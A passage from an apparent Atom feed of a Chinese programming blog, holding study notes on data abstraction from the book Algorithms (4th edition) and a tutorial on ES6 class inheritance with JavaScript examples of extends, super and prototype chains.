&lt;p&gt;Flex出现前&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我们是这样布局的：&lt;br&gt;1、正常文档流&lt;br&gt;2、&lt;code&gt;float&lt;/code&gt; + &lt;code&gt;clear&lt;/code&gt; 清除浮动&lt;br&gt;3、&lt;code&gt;relative&lt;/code&gt; + &lt;code&gt;absolute&lt;/code&gt;&lt;br&gt;4、负&lt;code&gt;margin&lt;/code&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="CSS" scheme="wangsiyuan233.github.io/tags/CSS/"/>
    
  </entry>
  
  <entry>
    <title>&lt;Algorithms&gt;-1.2数据抽象</title>
    <link href="wangsiyuan233.github.io/2018/04/15/43Algorithms1-2/"/>
    <id>wangsiyuan233.github.io/2018/04/15/43Algorithms1-2/</id>
    <published>2018-04-15T13:08:59.793Z</published>
    <updated>2018-04-22T13:39:27.090Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://book.douban.com/subject/10432347/" target="_blank" rel="external">《算法 （第四版）》</a>梳理框架</p><p>不建议阅读，反正你也读不下去<br><a id="more"></a></p><blockquote><p>1.2 数据抽象</p></blockquote><p>从这一个小节开始，我们讨论一种更加抽象的表达类型<br>/<em> 2018/4/21 p63-p72 </em>/<br>在使用抽象数据时，我们的注意力在API的操作</p><p><strong>1.2.1使用抽象数据类型</strong><br>Counter的值是一个名称和非负整数，初始化0 + 当前值加一 +获取当前值<br>1.2.1.1 抽象数据类型的API<br>抽象数据类型和静态方法库有很多相同之处：<br>1、均为Java类<br>2、可以有0 或 多个参数<br>3、可以返回一个指定数据类型，也有可能不会<br>抽象数据类型和静态方法库的不同之处：<br>1、构造函数会出现若干个名称和类名相同且没有返回值的函数<br>2、实例方法不需要 static 关键字<br>3、继承方法<br>1.2.1.2 继承方法<br>任意数据类型都可以通过API获得<br>1.2.1.3 用例代码<br>API可以让我们写出用例代码而不用知道它是怎样具体实现的<br>1.2.1.4 对象<br>对象是能够承载数据类型的值的实体<br>1.2.1.5 创建对象<br>每一个数据类型的值都存在对象里<br>当我们new一个函数的时候<br>1、分配一个内存空间<br>2、初始化一个值<br>3、返回引用对象<br>1.2.1.6 调用实例方法<br>实例方法和静态方法的调用方式完全相同<br>静态方法的主要作用是实现函数<br>实例方法的主要作用是实现数据类型的操作<br>1.2.1.7 使用对象<br>声明变量，使用new触发函数，调用实例方法<br>1.2.1.8 赋值语句<br>使用引用类型的赋值语句会创建该引用类型的一个副本<br>赋值语句不会创建新的对象<br>两个变量同时指向同一个对象<br>1.2.1.9 将对象作为参数<br>将对象作为参数传给方法，一般能简化用例代码<br>1.2.1.10 将对象作为返回值<br>Java中的方法只有一个返回值，而有了对象我们就能返回多个值了<br>1.2.1.11 数组也是对象<br>Java中，非原始数据类型的值都是对象<br>当我们将数组传递给一个方法或是将一个数组变量放在赋值语句的右侧时<br>我们是在创建该数组引用的一个副本，而不是这个数组的副本<br>1.2.1.12 对象的数组<br>/<em> 2018/4/22 p72-p84 </em>/<br>当我们创建了一个数组对象，意味着我们：<br>1、用括号语法创建了一个数组构造器<br>2、运用一个标准的构造器创建了数组里的每一个对象</p><p><strong>1.2.2 抽象数据类型举例</strong><br>这一小节会介绍一些ADT，你不用知道它的原理就可以用它<br>1.2.2.1 几何对象<br>面向对象编程的一个典型例子是为几何对象设计数据类型<br>1.2.2.2 信息处理<br>为了简化用例的代码，我们为每个类型都提供了两个构造函数<br>一个接受数据，一个解析数据<br>用例还是不需要知道数据的表示方法<br>1.2.2.3 字符串<br>string值和字符数组是不同的<br>数组可以访问每个字符<br>string为操作准备了实例方法<br>1.2.2.4 再谈输入和输出<br>面向对象编程要求我们同时输入和输出</p><p>1.2.3 抽象数据类型的实现<br>第一部分 定义数据类型的值的实例变量<br>第二部分 构造函数和实例方法</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://book.douban.com/subject/10432347/&quot;&gt;《算法 （第四版）》&lt;/a&gt;梳理框架&lt;/p&gt;
&lt;p&gt;不建议阅读，反正你也读不下去&lt;br&gt;
    
    </summary>
    
    
      <category term="算法" scheme="wangsiyuan233.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>初探ES6(5)--Class的继承</title>
    <link href="wangsiyuan233.github.io/2018/04/12/42%E5%88%9D%E6%8E%A2ES6-5/"/>
    <id>wangsiyuan233.github.io/2018/04/12/42初探ES6-5/</id>
    <published>2018-04-13T01:22:09.000Z</published>
    <updated>2018-04-14T00:59:19.198Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><strong>1、</strong>Class 可以通过<code>extends</code>关键字实现继承，这比 ES5 的通过修改原型链实现继承，要清晰和方便很多。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ColorPoint</span> <span class="keyword">extends</span> <span class="title">Point</span> </span>&#123;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>（上面代码定义了一个<code>ColorPoint</code>类，该类通过<code>extends</code>关键字，继承了<code>Point</code>类的所有属性和方法。但是由于没有部署任何代码，所以这两个类完全一样，等于复制了一个<code>Point</code>类。下面，我们在<code>ColorPoint</code>内部加上代码。）<br><a id="more"></a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ColorPoint</span> <span class="keyword">extends</span> <span class="title">Point</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>(x, y, color) &#123;</div><div class="line">    <span class="keyword">super</span>(x, y); <span class="comment">// 调用父类的constructor(x, y)</span></div><div class="line">    <span class="keyword">this</span>.color = color;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  toString() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.color + <span class="string">' '</span> + <span class="keyword">super</span>.toString(); <span class="comment">// 调用父类的toString()</span></div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>（上面代码中，<code>constructor</code>方法和<code>toString</code>方法之中，都出现了<code>super</code>关键字，它在这里表示<strong>父类</strong>的构造函数，用来<strong>新建父类的<code>this</code>对象</strong>。）</p><p><strong>子类必须在<code>constructor</code>方法中调用<code>super</code>方法，否则新建实例时会报错。</strong>这是因为子类没有自己的<code>this</code>对象，而是继承父类的<code>this</code>对象，然后对其进行加工。如果不调用super方法，子类就得不到<code>this</code>对象。</p><p>ES5 的继承，实质是<strong>先创造子类</strong>的实例对象<code>this</code>，然后再将父类的方法添加到<code>this</code>上面（<code>Parent.apply(this)</code>）。<br>ES6 的继承机制完全不同，实质是<strong>先创造父类</strong>的实例对象<code>this</code>（所以必须先调用<code>super</code>方法），然后再用子类的构造函数修改<code>this</code>。</p><p><strong>2、</strong>在子类的构造函数中，只有调用<code>super</code>之后，才可以使用<code>this</code>关键字，否则会报错。这是因为子类实例的构建，是基于对父类实例加工，只有<code>super</code>方法才能返回父类实例。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>(x, y) &#123;</div><div class="line">    <span class="keyword">this</span>.x = x;</div><div class="line">    <span class="keyword">this</span>.y = y;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ColorPoint</span> <span class="keyword">extends</span> <span class="title">Point</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>(x, y, color) &#123;</div><div class="line">    <span class="keyword">this</span>.color = color; <span class="comment">// ReferenceError</span></div><div class="line">    <span class="keyword">super</span>(x, y);</div><div class="line">    <span class="keyword">this</span>.color = color; <span class="comment">// 正确</span></div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>（上面代码中，子类的<code>constructor</code>方法没有调用<code>super</code>之前，就使用<code>this</code>关键字，结果报错，而放在<code>super</code>方法之后就是正确的。）</p><p><strong>3、</strong>可以使用<code>Object.getPrototypeOf</code>方法判断，一个类是否继承了另一个类。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Object</span>.getPrototypeOf(ColorPoint) === Point  <span class="comment">// true</span></div></pre></td></tr></table></figure></p><h2 id="二、extends-的继承目标"><a href="#二、extends-的继承目标" class="headerlink" title="二、extends 的继承目标"></a>二、<code>extends</code> 的继承目标</h2><p><code>extends</code>后面可以跟多种类型的值。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//第一种，子类继承Object类。</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">extends</span> <span class="title">Object</span> </span>&#123;</div><div class="line">&#125;</div><div class="line"></div><div class="line">A.__proto__ === <span class="built_in">Object</span> <span class="comment">// true</span></div><div class="line">A.prototype.__proto__ === <span class="built_in">Object</span>.prototype <span class="comment">// true</span></div></pre></td></tr></table></figure></p><p>（第1种情况下，A其实就是构造函数<code>Object</code>的复制，A的实例就是<code>Object</code>的实例。）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//第二种，不存在任何继承。</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</div><div class="line">&#125;</div><div class="line"></div><div class="line">A.__proto__ === <span class="built_in">Function</span>.prototype <span class="comment">// true</span></div><div class="line">A.prototype.__proto__ === <span class="built_in">Object</span>.prototype <span class="comment">// true</span></div></pre></td></tr></table></figure><p>（第2种情况下，A作为一个基类（即不存在任何继承），就是一个普通函数，所以直接继承<code>Function.prototype</code>。但是，A调用后返回一个空对象（即<code>Object</code>实例），所以<code>A.prototype.__proto__</code>指向构造函数（Object）的<code>prototype</code>属性。）<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//第三种，子类继承null。</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">extends</span> <span class="title">null</span> </span>&#123;</div><div class="line">&#125;</div><div class="line"></div><div class="line">A.__proto__ === <span class="built_in">Function</span>.prototype <span class="comment">// true</span></div><div class="line">A.prototype.__proto__ === <span class="literal">undefined</span> <span class="comment">// true</span></div></pre></td></tr></table></figure></p><p>（第3情况与第2种情况非常像。A也是一个普通函数，所以直接继承<code>Function.prototype</code>。但是，A调用后返回的对象不继承任何方法，所以它的<code>__proto__</code>指向<code>Function.prototype</code>，即实质上执行了下面的代码。）</p><h2 id="三、super"><a href="#三、super" class="headerlink" title="三、super"></a>三、<code>super</code></h2><p><code>super</code>关键字，既可以当作函数使用，也可以当作对象使用。在这两种情况下，它的用法完全不同。<br><strong>1、当作函数使用</strong><br><code>super</code>作为函数调用时，代表父类的构造函数。ES6 要求，子类的构造函数必须执行一次<code>super</code>函数。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>() &#123;</div><div class="line">    <span class="keyword">super</span>();</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>（上面代码中，子类B的构造函数之中的<code>super()</code>，代表调用父类的构造函数。这是必须的，否则 JavaScript 引擎会报错。）</p><p>注意，<code>super</code>虽然代表了父类A的构造函数，但是返回的是子类B的实例，<strong>即<code>super</code>内部的this指的是B</strong>，因此<code>super()</code>在这里相当于<code>A.prototype.constructor.call(this)</code>。</p><p>作为函数时，super()只能用在<strong>子类的构造函数</strong>之中，用在其他地方就会报错。</p><p><strong>2、当作对象使用</strong></p><p><strong>在普通方法中，指向父类的原型对象；在静态方法中，指向父类。</strong></p><p>2.1普通方法，指向父类的原型对象<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</div><div class="line">  p() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="number">2</span>;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>() &#123;</div><div class="line">    <span class="keyword">super</span>();</div><div class="line">    <span class="built_in">console</span>.log(<span class="keyword">super</span>.p()); <span class="comment">// 2</span></div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">let</span> b = <span class="keyword">new</span> B();</div></pre></td></tr></table></figure></p><p>（上面代码中，子类B当中的<code>super.p()</code>，就是将<code>super</code>当作一个对象使用。这时，<code>super</code>在普通方法之中，指向<code>A.prototype</code>，所以<code>super.p()</code>就相当于<code>A.prototype.p()</code>。）</p><p>ES6 规定，在子类普通方法中通过<code>super</code>调用父类的方法时，方法内部的<code>this</code><strong>指向当前的子类实例</strong>。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>() &#123;</div><div class="line">    <span class="keyword">this</span>.x = <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  print() &#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.x);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>() &#123;</div><div class="line">    <span class="keyword">super</span>();</div><div class="line">    <span class="keyword">this</span>.x = <span class="number">2</span>;</div><div class="line">  &#125;</div><div class="line">  m() &#123;</div><div class="line">    <span class="keyword">super</span>.print();</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">let</span> b = <span class="keyword">new</span> B();</div><div class="line">b.m() <span class="comment">// 2</span></div></pre></td></tr></table></figure></p><p>（上面代码中，<code>super.print()</code>虽然调用的是<code>A.prototype.print()</code>，但是<code>A.prototype.print()</code>内部的<code>this</code>指向子类B的实例，导致输出的是2，而不是1。也就是说，实际上执行的是<code>super.print.call(this)</code>。）</p><p>由于<code>this</code>指向子类实例，所以如果通过<code>super</code>对某个属性赋值，这时<code>super</code>就是<code>this</code>，赋值的属性会变成子类实例的属性。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>() &#123;</div><div class="line">    <span class="keyword">this</span>.x = <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>() &#123;</div><div class="line">    <span class="keyword">super</span>();</div><div class="line">    <span class="keyword">this</span>.x = <span class="number">2</span>;</div><div class="line">    <span class="keyword">super</span>.x = <span class="number">3</span>;</div><div class="line">    <span class="built_in">console</span>.log(<span class="keyword">super</span>.x); <span class="comment">// undefined</span></div><div class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.x); <span class="comment">// 3</span></div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">let</span> b = <span class="keyword">new</span> B();</div></pre></td></tr></table></figure></p><p>（上面代码中，<code>super.x</code>赋值为3，这时等同于对<code>this.x</code>赋值为3。而当读取<code>super.x</code>的时候，读的是<code>A.prototype.x</code>，所以返回<code>undefined</code>。）</p><p>2.2静态方法中，指向父类<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span> </span>&#123;</div><div class="line">  <span class="keyword">static</span> myMethod(msg) &#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'static'</span>, msg);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  myMethod(msg) &#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'instance'</span>, msg);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span> <span class="keyword">extends</span> <span class="title">Parent</span> </span>&#123;</div><div class="line">  <span class="keyword">static</span> myMethod(msg) &#123;</div><div class="line">    <span class="keyword">super</span>.myMethod(msg);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  myMethod(msg) &#123;</div><div class="line">    <span class="keyword">super</span>.myMethod(msg);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">Child.myMethod(<span class="number">1</span>); <span class="comment">// static 1</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> child = <span class="keyword">new</span> Child();</div><div class="line">child.myMethod(<span class="number">2</span>); <span class="comment">// instance 2</span></div></pre></td></tr></table></figure></p><p>（上面代码中，<code>super</code>在静态方法之中指向父类，在普通方法之中指向父类的原型对象。）</p><p>在子类的静态方法中通过<code>super</code>调用父类的方法时，方法内部的<code>this</code>指向当前的子类，而不是子类的实例。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>() &#123;</div><div class="line">    <span class="keyword">this</span>.x = <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">static</span> print() &#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.x);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>() &#123;</div><div class="line">    <span class="keyword">super</span>();</div><div class="line">    <span class="keyword">this</span>.x = <span class="number">2</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">static</span> m() &#123;</div><div class="line">    <span class="keyword">super</span>.print();</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">B.x = <span class="number">3</span>;</div><div class="line">B.m() <span class="comment">// 3</span></div></pre></td></tr></table></figure></p><p>（上面代码中，静态方法<code>B.m</code>里面，<code>super.print</code>指向父类的静态方法。这个方法里面的<code>this</code>指向的是B，而不是B的实例）</p><h2 id="四、类的-prototype属性和-proto-属性"><a href="#四、类的-prototype属性和-proto-属性" class="headerlink" title="四、类的 prototype属性和__proto__属性"></a>四、类的 <code>prototype</code>属性和<code>__proto__</code>属性</h2><p>ES5 中，每一个对象都有<code>__proto__</code>属性，指向对应的构造函数的<code>prototype</code>属性。<br>Class 作为构造函数的语法糖，同时有<code>prototype</code>属性和<code>__proto__</code>属性，因此同时存在两条继承链。<br><strong>1、</strong>子类的<code>__proto__</code>属性，表示构造函数的继承，总是指向父类。<br><strong>2、</strong>子类<code>prototype</code>属性的<code>__proto__</code>属性，<strong>表示方法的继承</strong>，总是指向父类的<code>prototype</code>属性。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</div><div class="line">&#125;</div><div class="line"></div><div class="line">B.__proto__ === A <span class="comment">// true</span></div><div class="line">B.prototype.__proto__ === A.prototype <span class="comment">// true</span></div></pre></td></tr></table></figure></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Object</span>.setPrototypeOf(B.prototype, A.prototype);</div><div class="line"><span class="comment">// 等同于</span></div><div class="line">B.prototype.__proto__ = A.prototype;</div><div class="line"></div><div class="line"><span class="built_in">Object</span>.setPrototypeOf(B, A);</div><div class="line"><span class="comment">// 等同于</span></div><div class="line">B.__proto__ = A;</div></pre></td></tr></table></figure><p>上面这两条继承链，可以这样理解：<br><strong>作为一个对象，子类（B）的原型（<code>__proto__</code>属性）是父类（A）；</strong><br><strong>作为一个构造函数，子类（B）的原型对象（<code>prototype</code>属性）是父类的原型对象（<code>prototype</code>属性）的实例。</strong></p><h2 id="五、实例的-proto-属性"><a href="#五、实例的-proto-属性" class="headerlink" title="五、实例的 __proto__属性"></a>五、实例的 <code>__proto__</code>属性</h2><p>子类实例的<code>__proto__</code>属性的<code>__proto__</code>属性，指向父类实例的<code>__proto__</code>属性。也就是说，子类的原型的原型，是父类的原型。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Point(<span class="number">2</span>, <span class="number">3</span>);</div><div class="line"><span class="keyword">var</span> p2 = <span class="keyword">new</span> ColorPoint(<span class="number">2</span>, <span class="number">3</span>, <span class="string">'red'</span>);</div><div class="line"></div><div class="line">p2.__proto__ === p1.__proto__ <span class="comment">// false</span></div><div class="line">p2.__proto__.__proto__ === p1.__proto__ <span class="comment">// true</span></div></pre></td></tr></table></figure></p><p>（上面代码中，<code>ColorPoint</code>继承了<code>Point</code>，导致前者原型的原型是后者的原型。）</p><h2 id="六、原生构造函数的继承"><a href="#六、原生构造函数的继承" class="headerlink" title="六、原生构造函数的继承"></a>六、原生构造函数的继承</h2><p>ES5 中原生构造函数是无法继承的。<br><code>Boolean()</code>、<code>Number()</code>、<code>String()</code>、<code>Array()</code>、<code>Date()</code>、<code>Function()</code>、<code>RegExp()</code>、<code>Error()</code>、<code>Object()</code><br>ES6 允许继承原生构造函数定义子类，因为 ES6 是先新建父类的实例对象<code>this</code>，然后再用子类的构造函数修饰<code>this</code>，使得父类的所有行为都可以继承。下面是一个继承<code>Array</code>的例子。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyArray</span> <span class="keyword">extends</span> <span class="title">Array</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>(...args) &#123;</div><div class="line">    <span class="keyword">super</span>(...args);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> arr = <span class="keyword">new</span> MyArray();</div><div class="line">arr[<span class="number">0</span>] = <span class="number">12</span>;</div><div class="line">arr.length <span class="comment">// 1</span></div><div class="line"></div><div class="line">arr.length = <span class="number">0</span>;</div><div class="line">arr[<span class="number">0</span>] <span class="comment">// undefined</span></div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;一、简介&quot;&gt;&lt;a href=&quot;#一、简介&quot; class=&quot;headerlink&quot; title=&quot;一、简介&quot;&gt;&lt;/a&gt;一、简介&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;1、&lt;/strong&gt;Class 可以通过&lt;code&gt;extends&lt;/code&gt;关键字实现继承，这比 ES5 的通过修改原型链实现继承，要清晰和方便很多。&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Point&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;ColorPoint&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Point&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;（上面代码定义了一个&lt;code&gt;ColorPoint&lt;/code&gt;类，该类通过&lt;code&gt;extends&lt;/code&gt;关键字，继承了&lt;code&gt;Point&lt;/code&gt;类的所有属性和方法。但是由于没有部署任何代码，所以这两个类完全一样，等于复制了一个&lt;code&gt;Point&lt;/code&gt;类。下面，我们在&lt;code&gt;ColorPoint&lt;/code&gt;内部加上代码。）&lt;br&gt;
    
    </summary>
    
    
      <category term="ES6" scheme="wangsiyuan233.github.io/tags/ES6/"/>
    
  </entry>
  
</feed>
